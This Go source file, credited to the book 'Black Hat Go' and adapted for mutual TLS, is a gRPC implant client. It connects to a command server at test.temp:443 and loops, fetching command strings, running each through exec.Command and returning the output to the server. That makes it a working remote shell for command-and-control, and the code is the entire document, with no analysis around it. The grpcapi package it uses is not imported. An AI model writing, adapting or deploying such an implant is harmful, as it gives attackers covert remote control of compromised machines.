// Taken from blackhat Go, adapted for mTLS

package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io/ioutil"
	"log"
	"os/exec"
	"strings"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.ImplantClient
	)

		//---------- TLS Setting -----------//
	certificate, err := tls.LoadX509KeyPair(
		"/etc/server/certs/server-cert.pem",
		"/etc/server/certs/server-key.pem",
	)

	certPool := x509.NewCertPool()
	bs, err := ioutil.ReadFile("/etc/server/certs/ca-cert.pem")
	if err != nil {
		log.Fatalf("failed to read ca cert: %s", err)
	}

	ok := certPool.AppendCertsFromPEM(bs)
	if !ok {
		log.Fatal("failed to append certs")
	}

	transportCreds := credentials.NewTLS(&tls.Config{
		ServerName:   "test.temp",
		Certificates: []tls.Certificate{certificate},
		RootCAs:      certPool,
	})
	
	if conn, err = grpc.Dial(fmt.Sprintf("test.temp:%d", 443), grpc.WithTransportCredentials(transportCreds)); err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	client = grpcapi.NewImplantClient(conn)

	ctx := context.Background()
	for {
		var req = new(grpcapi.Empty)
		cmd, err := client.FetchCommand(ctx, req)
		if err != nil {
			log.Fatal(err)
		}
		if cmd.In == "" {
			// No work
			time.Sleep(3 * time.Second)
			continue
		}

		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		cmd.Out += string(buf)
		client.SendOutput(ctx, cmd)
	}
}

